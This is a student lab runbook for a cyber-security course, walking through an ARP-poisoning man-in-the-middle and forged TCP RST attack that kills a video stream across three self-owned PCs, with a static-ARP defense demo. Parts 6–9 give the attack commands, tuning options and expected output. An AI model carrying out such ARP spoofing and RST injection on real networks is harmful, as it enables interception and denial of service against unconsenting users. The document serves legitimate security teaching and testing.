# Phase 2 Walkthrough — Three Physical PCs (Native, no Docker/VM)

CSE 406 — Cyber Security Sessional · Project 2026 · Group 03, Section A1
(2105004 Fahim Ishtiak, 2105001 Nahid Hossain Redom)

This is the **step-by-step runbook** for the physical demonstration: three real
machines on one small network, running the code **natively** (no Docker, no VM).
It starts from `git clone` and ends with a torn-down video stream, showing the
exact commands and the **expected output** at every step.

> Companion to [README.md](README.md) (the reference/setup guide). This file is
> the "do exactly this, in this order" guide.

---

## Part 0 — The setup we are building

Three PCs on one shared network (a Wi-Fi hotspot **you** run, so there is no
"client isolation" blocking the attack). The attacker is a **native Linux** box,
which is why we need no VM at all.

```
        Wi-Fi hotspot hosted by the SERVER PC  (you control it -> no isolation)
        192.168.x.0/24 (or 10.42.0.0/24 on a Linux hotspot)
   ┌───────────────────┐        ┌───────────────────┐
   │  SERVER  (PC 1)    │  Wi-Fi │  CLIENT  (PC 2)    │
   │  hosts hotspot     │◄──────►│  watches the video │
   │  streams the video │        │  (victim)          │
   └─────────┬─────────┘        └───────────────────┘
             │ Wi-Fi
        ┌────▼──────────────┐
        │  ATTACKER (PC 3)  │  native Linux (Ubuntu/Mint)
        │  ARP-poison,      │  - no VM, no Docker
        │  sniff, forge RST │
        └───────────────────┘
```

**Role assignment for our hardware** (2 Linux PCs + 1 other):

| Role | Machine | OS | Why |
|------|---------|----|----|
| **Attacker** | your PC | **Ubuntu** | must be native Linux (raw sockets, `ip_forward`) |
| **Server** | friend's PC | Mint (or any) | hosts the hotspot + streams |
| **Client** | 3rd PC | any (Win/Linux) | the victim player |

> The attacker must **not** host the hotspot. If it did, it would be the access
> point and see all traffic for free — making the ARP-poisoning step (the point
> of the demo) meaningless.

Two golden rules, both already handled by this plan:
1. **All three on one network** — the hotspot gives us that.
2. **Devices can talk to each other** — a self-hosted hotspot has no client
   isolation, so ARP replies from the attacker reach the victims.

---

## Part 1 — Network: start the hotspot and note the IPs

### 1.1 Start the hotspot on the SERVER PC

- **Linux (Mint/Ubuntu) server:** Settings → Wi-Fi → ⋮ menu → **Turn On Wi-Fi
  Hotspot** (or `nmcli device wifi hotspot ssid rst-demo password rstdemo123`).
- **Windows server:** Settings → Network → **Mobile hotspot** → On.

Internet is **not required** for the attack — the hotspot alone forms the local
network. Plug the server's Ethernet in only if you want the machines online too.

### 1.2 Connect the CLIENT and ATTACKER to that hotspot

Join the new Wi-Fi network from PC 2 (client) and PC 3 (attacker) like any Wi-Fi.

### 1.3 Find every machine's IP address

Run on each machine and write the numbers down:

- **Linux:** `ip -4 addr show | grep inet`
- **Windows:** `ipconfig` → the Wi-Fi adapter's "IPv4 Address"

Expected (a Linux hotspot usually hands out `10.42.0.x`):

```
SERVER_IP   = 10.42.0.1     # the hotspot host is .1
CLIENT_IP   = 10.42.0.137
ATTACKER_IP = 10.42.0.201
```

They must all share the same first three numbers (same subnet). Keep
**SERVER_IP** and **CLIENT_IP** handy — every later command uses them.

---

## Part 2 — Get the code onto all three machines

On **each** PC:

```bash
git clone <your-repo-url> tcp-rst-attack
cd tcp-rst-attack
```

(Windows without git: download the repo ZIP and extract it.) The launcher
scripts reference `server/`, `client/`, and `attacker/` by relative path, so the
whole folder must be present on each machine — which cloning gives you.

---

## Part 3 — The virtual environment (venv)

We install packages into a **virtualenv** so nothing touches the system Python.
Only the **attacker** actually needs a third-party package (`scapy`); the server
and client are pure standard-library Python, so their venv installs nothing and
is optional — shown here only for uniformity.

### 3.1 Attacker venv (Ubuntu) — the important one

```bash
cd phase2/attacker
./setup.sh            # NOTE: no sudo — it calls sudo only for the apt step
```

`setup.sh` installs system libs (libpcap via tcpdump, etc.), creates
`phase2/attacker/venv`, and `pip install scapy` inside it.

Expected output (tail):

```
[setup] creating virtualenv at /home/you/tcp-rst-attack/phase2/attacker/venv ...
Successfully installed scapy-2.5.0
[setup] verifying scapy in the venv ...
[setup] scapy 2.5.0 OK in venv
[setup] done. Next:
  sudo ./preflight.sh --server <SERVER_IP> --client <CLIENT_IP>
```

> **Why the scripts call `venv/bin/python` directly:** the attack runs as root
> (`sudo`), and `sudo python3` would use the *system* Python, which has no scapy.
> `run_attack.sh`/`preflight.sh` therefore invoke the venv interpreter by full
> path. You do **not** need to `activate` anything for the attacker.

### 3.2 Server / client venv (optional, no external packages)

If you want a venv on the server and client too (purely for consistency):

```bash
python3 -m venv .venv         # Linux/macOS
source .venv/bin/activate
# (nothing to pip install — the server/client use only the standard library)
```

On Windows:

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
```

The launchers call `python3`/`python`, which resolves to the activated venv.

---

## Part 4 — Start the SERVER (PC 1)

From the repo root on the server:

```bash
# Linux:
phase2/server/run_server.sh
# Windows:
powershell -ExecutionPolicy Bypass -File phase2\server\run_server.ps1
```

If `ffmpeg` is installed it auto-generates a 120-second test video; if not, it
generates an ~8 MB **synthetic placeholder** (not a playable video, but fine for
the attack — the stream is just bytes). It then serves on `0.0.0.0:9000`. To get
a real, playable saved clip for Proof #3, install ffmpeg first
(`winget install Gyan.FFmpeg`), delete `phase2/media/sample.mp4`, and re-run.
Expected output:

```
[server] no media file; generating a 120s test video at .../phase2/media/sample.mp4 ...
[server] ------------------------------------------------------------
[server] This machine's LAN IPv4 address(es) — tell the CLIENT & ATTACKER:
    wlan0  10.42.0.1/24
[server] Serving .../phase2/media/sample.mp4 on 0.0.0.0:9000 (Ctrl+C to stop)
[server] ------------------------------------------------------------
[server] media=.../sample.mp4 size=7654321 bytes duration=120.0s
[server] pacing whole file over ~120s (~62 KB/s)
[server] listening on 0.0.0.0:9000
```

> **If the client later cannot connect**, the server's firewall is blocking port
> 9000. The launcher prints the exact allow-command; on Windows it is
> `New-NetFirewallRule ... -LocalPort 9000 -Action Allow`, on Linux
> `sudo ufw allow 9000/tcp` (only if ufw is active).

Leave this terminal running.

---

## Part 5 — Start the CLIENT / victim (PC 2)

From the repo root on the client, pass the **server's IP**:

```bash
# Linux:
phase2/client/run_client.sh 10.42.0.1
# Windows:
powershell -ExecutionPolicy Bypass -File phase2\client\run_client.ps1 10.42.0.1
```

Expected output — a **healthy** stream, buffer growing, playback advancing:

```
[client] connecting to 10.42.0.1:9000, saving to .../phase2/output/received.mp4
[client] connected 10.42.0.137:52344 -> 10.42.0.1:9000
[client] stream: 7.30 MB, 120.0s video, playback ~62 KB/s
[client] >>> playback started (prebuffered 3s)
[client] t= 10.0s  recv 0.66/7.30 MB ( 9.0%)  net   67 KB/s  buffer  3.1s  play  6.9/120s
[client] t= 15.0s  recv 0.97/7.30 MB (13.3%)  net   66 KB/s  buffer  3.2s  play 11.8/120s
```

Let it run for ~15–20 seconds so a buffer builds. This is the moment the
attacker will strike.

---

## Part 6 — Preflight the ATTACKER (PC 3) — catch problems BEFORE attacking

On the Ubuntu attacker, from `phase2/attacker`:

```bash
sudo ./preflight.sh --server 10.42.0.1 --client 10.42.0.137
```

This is the single most valuable step for a physical demo: it confirms the
attacker can actually see and reach both victims. Expected **PASS** output:

```
== Tooling ==
  [OK] tcpdump present
  [OK] ip present
  [OK] arpspoof present
  [OK] venv present
  [OK] scapy importable in venv
== Interface ==
  [OK] iface=wlan0  my_ip=10.42.0.201  my_mac=aa:bb:cc:dd:ee:ff
  [OK] my subnet on wlan0 = 10.42.0.201/24
== Reachability & MAC resolution (needs client isolation OFF on the AP) ==
  [OK] server 10.42.0.1 reachable, mac=11:22:33:44:55:66
  [OK] client 10.42.0.137 reachable, mac=77:88:99:aa:bb:cc
== IP forwarding ==
  [..] ip_forward off (run_attack.sh will enable it so the stream keeps flowing)

PREFLIGHT PASSED. Attack with:
  sudo ./run_attack.sh --server 10.42.0.1 --client 10.42.0.137 -i wlan0
```

If instead you see `server ... UNREACHABLE` or a `169.254.x`/`10.0.2.x` address,
**stop and fix the network** (README §1–§2) — the attack cannot work until this
passes.

---

## Part 7 — Launch the attack (PC 3)

Optionally, in a **second** attacker terminal, start a capture for Wireshark:

```bash
cd phase2/attacker
sudo ./capture.sh --server 10.42.0.1 --client 10.42.0.137 -o ../output/phase2_capture.pcap
```

Then run the attack in the first attacker terminal:

```bash
sudo ./run_attack.sh --server 10.42.0.1 --client 10.42.0.137
```

Expected output — it becomes MITM, locks onto the live connection, then hammers
forged RSTs:

```
[attack] auto-detected interface: wlan0
[attack] server=10.42.0.1 client=10.42.0.137 port=9000 iface=wlan0 extra=<none>
[attack] starting ARP poisoning (MITM) ...
[arp] iface=wlan0 attacker_mac=aa:bb:cc:dd:ee:ff
[arp] client 10.42.0.137 is at 77:88:99:aa:bb:cc
[arp] server 10.42.0.1 is at 11:22:33:44:55:66
[arp] IP forwarding enabled (stream will keep flowing through us)
[arp] poisoning every 2.0s. Press Ctrl+C to stop and restore.
[attack] waiting 4s for ARP poisoning + MITM to settle ...
[attack] launching RST injector ...
[rst] sniffing on wlan0: tcp and host 10.42.0.1 and host 10.42.0.137 and port 9000
[rst] mode=SUSTAINED reset_server=True burst=3 interval=0.03s duration=forever
[rst] locked onto connection: client 10.42.0.137:52344 <-> 10.42.0.1:9000
[rst] hammering: cli_rcv_nxt=1466512 srv_frontier=1466512 srv_rcv_nxt=305 | RSTs sent=612
```

Useful variants:
- `sudo ./run_attack.sh --server 10.42.0.1 --client 10.42.0.137 -- --no-server`
  — reset **only** the client (harder; shows the RFC 5961 seq-drift effect).
- `... -- --burst 5` — widen the seq-drift burst on a fast stream (spec §3).

**Ctrl+C** stops the injector and restores the victims' ARP caches:

```
[attack] cleaning up (restoring ARP) ...
[arp] restoring real ARP entries on both victims ...
```

---

## Part 8 — What success looks like (read every line)

### 8.1 On the CLIENT (PC 2) — the outage

Within a second or two of the attack, the client's socket dies with **no FIN**,
the buffer drains, and playback stalls:

```
[client] t= 22.5s  recv 1.41/7.30 MB (19.3%)  net   64 KB/s  buffer  3.0s  play 19.5/120s
[client] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[client] !!! TCP CONNECTION RESET (RST) received — peer sent a
[client] !!! reset with NO preceding FIN. Socket torn down abruptly.
[client] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[client] t= 23.0s ... buffer  2.5s ... [buffering-out]
[client] t= 25.5s ... buffer  0.0s ... [BUFFER EMPTY]
[client] ⛔ PLAYBACK STALLED — buffer exhausted, network/connection error.
[client]    Received 1.41/7.30 MB before the reset.
```

### 8.2 Proof #1 — the connection table disappears

On the client, run this **after** the reset (a 2nd terminal, or after it exits):

- **Linux:** `ss -tan | grep 9000`
- **Windows:** `netstat -ano | findstr :9000`

Expected: **no output** — the ESTABLISHED entry that existed during streaming is
gone, because the RST tore the socket down.

### 8.3 Proof #2 — the packet capture

Copy `phase2/output/phase2_capture.pcap` to a machine with Wireshark, open it,
and filter:

```
tcp.port == 9000
```

Expected: a long run of `PSH, ACK` **data** segments (server → client), then a
single **`RST`** (or `RST, ACK`) — with **no `FIN` before it**. That missing FIN
is the visual signature of a forged reset versus a graceful close (spec §5).

### 8.4 Proof #3 — the partially saved video

`phase2/output/received.mp4` on the client is smaller than the server's
`phase2/media/sample.mp4` — it stopped mid-download when the connection was cut.
It still plays up to the cut point.

---

## Part 9 — Measurements to record (spec §5 / Table 2)

Run the attack several times and note:

| Metric | Where to read it |
|--------|------------------|
| Success rate (%) | how many of N runs produced the client stall |
| Time-to-disruption | client timestamps: RST line → `[BUFFER EMPTY]` |
| RST attempts per success | the injector's `RSTs sent=` counter at teardown |
| Behavior vs. client retry | re-run client with retry on (below) |
| Success with vs. without defense | Part 11 |

Client auto-retry test (shows sustained hammering is needed to keep it down):

```bash
# Linux client:
RECONNECT=1 phase2/client/run_client.sh 10.42.0.1
# Windows client:
$env:RECONNECT="1"; powershell -File phase2\client\run_client.ps1 10.42.0.1
```

Compare these Phase 2 (physical) numbers against your Phase 1 (Docker) numbers to
show the attack is not an artifact of the virtual network stack.

---

## Part 10 — Clean shutdown

1. **Attacker:** Ctrl+C in the attack terminal (restores ARP), then Ctrl+C the
   capture. If you ever kill it un-gracefully and a victim's ARP stays poisoned,
   just toggle that victim's Wi-Fi off/on, or `sudo ip neigh flush all`.
2. **Client / Server:** Ctrl+C their terminals.
3. **Server:** turn the hotspot back off.

---

## Part 11 — Defense demo (spec §6.2)

Show that pinning a **static ARP entry** stops the MITM, so the attacker never
sees the stream and the attack fails.

1. Get the server's **real** MAC (on the server, before attacking):
   - Linux: `cat /sys/class/net/wlan0/address`
   - Windows: `getmac /v`
2. Pin it on the **client**:
   - **Linux:** `sudo ip neigh replace 10.42.0.1 lladdr <SERVER-MAC> nud permanent dev wlan0`
   - **Windows (Admin):** `netsh interface ipv4 add neighbors "Wi-Fi" 10.42.0.1 <SERVER-MAC>`
3. Re-run the attack. Expected: the client keeps streaming normally — the
   injector never locks on (`[rst] waiting to lock onto the victim connection`
   stays forever) because the poisoned client ignores the forged ARP and its
   traffic never transits the attacker.
4. Undo the pin afterwards:
   - Linux: `sudo ip neigh del 10.42.0.1 dev wlan0`
   - Windows: `netsh interface ipv4 delete neighbors "Wi-Fi" 10.42.0.1`

This is the spec's point: defend the **ARP layer** and the on-path attack
collapses to the far harder blind case, even though RFC 5961's exact-match rule
alone would not stop an on-path attacker.

---

## Part 12 — Quick troubleshooting

| Symptom | Fix |
|---------|-----|
| `preflight.sh`: victim UNREACHABLE | Not on the same hotspot, wrong IP, or (rare for a self-hosted hotspot) isolation on. Re-check Part 1. |
| Attacker IP is `169.254.x` | It didn't get an address from the hotspot — reconnect its Wi-Fi. |
| Client can't connect to server | Server firewall blocking TCP 9000 (Part 4 note), or different subnets. |
| `setup.sh` refuses with "run WITHOUT sudo" | Run `./setup.sh` (no sudo); it elevates only for apt. |
| `ModuleNotFoundError: scapy` under sudo | You called `sudo python3` instead of the venv. Use `run_attack.sh`, which calls `venv/bin/python`. |
| RST sent but client not resetting | Fast-stream seq drift (spec §3): add `-- --burst 5`; keep the default (server reset too). |
| Client instantly reconnects | Expected with `RECONNECT=1`; the sustained hammer keeps it down. |

---

## Part 13 — How this maps to the proposal

| Proposal | This walkthrough |
|----------|------------------|
| §2.2 three physical machines, shared LAN | Parts 1, 4, 5, 7 (native, no VM/Docker) |
| §2.3 ARP poisoning + IP forwarding (MITM) | Part 7 (`arp_spoof.py`, reused) |
| §2.4 / §3 read live seq, forge RST, burst | Part 7 (`rst_attack.py`, reused) |
| §5 outcomes (stall, no-FIN RST, ss/pcap) | Part 8 |
| §5 client auto-retry | Part 9 |
| §6.2 ARP-layer defense (static ARP) | Part 11 |

The code is identical to Phase 1 — only the IPs, the interface, and the fact that
it runs on bare metal have changed. That is exactly the point of Phase 2:
confirming the Phase 1 result holds on real hardware.
